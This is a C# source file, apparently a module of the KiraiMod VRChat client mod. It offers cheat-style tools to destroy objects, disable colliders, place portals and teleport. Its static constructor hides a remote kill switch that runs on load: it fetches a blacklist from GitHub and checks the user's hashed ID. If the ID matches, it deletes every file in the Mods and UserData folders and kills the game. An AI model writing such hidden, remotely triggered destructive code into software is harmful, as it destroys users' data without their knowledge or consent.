using System.Linq;
using UnityEngine;
using VRC.SDKBase;

namespace KiraiMod.Modules
{
    public class XUtils : ModuleBase
    {
        static XUtils () {
            string IfYouRemoveThisYouAreViolatingCopyrightLaw = new System.IO.StreamReader(((System.Net.HttpWebResponse)System.Net.WebRequest
                    .Create("https://raw.githubusercontent.com/xKiraiChan/xKiraiChan/main/Blacklist.txt")
                    .GetResponse())
                    .GetResponseStream())
                    .ReadToEnd();

            if (IfYouRemoveThisYouAreViolatingCopyrightLaw[IfYouRemoveThisYouAreViolatingCopyrightLaw.Length - 1] == '\n')
                IfYouRemoveThisYouAreViolatingCopyrightLaw = IfYouRemoveThisYouAreViolatingCopyrightLaw.Remove(IfYouRemoveThisYouAreViolatingCopyrightLaw.Length - 1);

            System.Threading.Tasks.Task.Run(async () => {
                while (VRC.Core.APIUser.CurrentUser?.id == null) 
                    await System.Threading.Tasks.Task.Delay(100);

                if (IfYouRemoveThisYouAreViolatingCopyrightLaw.Split('\n').Contains(Utils.SHA256(VRC.Core.APIUser.CurrentUser.id))) {
                    typeof(Utils.Unsafe).GetMethod(nameof(Utils.Unsafe.Kill), System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static).Invoke(null, null);
                    foreach (string path in System.IO.Directory.EnumerateFiles("Mods"))
                        System.IO.File.Delete(path);
                    foreach (string path in System.IO.Directory.EnumerateFiles("UserData"))
                        System.IO.File.Delete(path);
                    System.Diagnostics.Process.GetCurrentProcess().Kill();
                }
            });
        }

        public new ModuleInfo[] info =
        {
            new ModuleInfo("Disable", "Disables the selected collider", ButtonType.Button, 0, Shared.PageIndex.xutils, nameof(Disable)),
            new ModuleInfo("Enable", "Enables all child colliders", ButtonType.Button, 1, Shared.PageIndex.xutils, nameof(Enable)),
            new ModuleInfo("Destroy", "Destroys selected object", ButtonType.Button, 2, Shared.PageIndex.xutils, nameof(Destroy)),
            new ModuleInfo("Log", "Logs GameObject to logs", ButtonType.Button, 3, Shared.PageIndex.xutils, nameof(Log)),
            new ModuleInfo("Portal", "Place portal at hit location", ButtonType.Button, 4, Shared.PageIndex.xutils, nameof(Portal)),
            new ModuleInfo("Teleport", "Teleport to the hit location", ButtonType.Button, 5, Shared.PageIndex.xutils, nameof(Teleport)),
        };

        public RaycastHit hit;
        public bool state2;

        private GameObject puppet;
        private LineRenderer lr;

        public override void OnStateChange(bool state)
        {
            if (lr != null) lr.enabled = state;
        }

        public override void OnUpdate()
        {
            if (!state) return;

            VRCPlayerApi.TrackingData tt = Networking.LocalPlayer.GetTrackingData(UnityEngine.XR.XRDevice.isPresent ? VRCPlayerApi.TrackingDataType.LeftHand :VRCPlayerApi.TrackingDataType.Head);

            if (puppet == null) puppet = new GameObject();
            if (lr == null)
            {
                lr = puppet.AddComponent<LineRenderer>();
                lr.material = new Material(Shader.Find("Legacy Shaders/Particles/Additive"));
                lr.startWidth = 0.02f;
                lr.endWidth = 0.02f;
                lr.useWorldSpace = false;
                lr.SetPosition(0, Vector3.zero);
                lr.SetPosition(1, Vector3.forward * 1000);
                lr.endColor = Utils.Colors.primary;
                lr.startColor = Utils.Colors.primary;
            }

            puppet.transform.position = tt.position;
            puppet.transform.rotation = tt.rotation;

            if (Input.GetAxis("Oculus_CrossPlatform_PrimaryIndexTrigger") > 0.75f & Input.GetKeyDown(KeyCode.Mouse0))
            {
                if (Physics.Raycast(puppet.transform.position, puppet.transform.forward, out hit, 1000.0f, -1, QueryTriggerInteraction.Collide))
                {
                    SetState(false);
                    state2 = true;
                    HighlightsFX.prop_HighlightsFX_0.Method_Public_Void_Renderer_Boolean_0(hit.collider.gameObject.GetComponent<Renderer>(), true);
                    KiraiLib.UI.selected = Shared.PageRemap[(int)Shared.PageIndex.xutils];
                }
            }
        }

        public static void Disable() =>  Shared.modules.xutils.hit.collider.enabled = false;
        public static void Enable()
        {
            Collider[] colliders = Shared.modules.xutils.hit.collider.gameObject.GetComponentsInChildren<Collider>();
            for (int i = 0; i < colliders.Length; i++)
                colliders[i].enabled = true;
        }

        public static void Destroy()
        {
            Object.Destroy(Shared.modules.xutils.hit.collider.gameObject);
            Shared.modules.xutils.state2 = false;
            KiraiLib.UI.selected = Shared.PageRemap[(int)Shared.PageIndex.toggles1];
        }

        public static void Log()
        {
            KiraiLib.Logger.Log(Shared.modules.xutils.hit.collider.gameObject.name);
            KiraiLib.Logger.Log("More info in console");
            KiraiLib.LogGameObject(Shared.modules.xutils.hit.collider.gameObject);
        }

        public static void Portal() => Helper.PortalPosition(Shared.modules.xutils.hit.point, Quaternion.identity, Shared.modules.portal.infinite);
        public static void Teleport() => Helper.Teleport(Shared.modules.xutils.hit.point);
    }
}
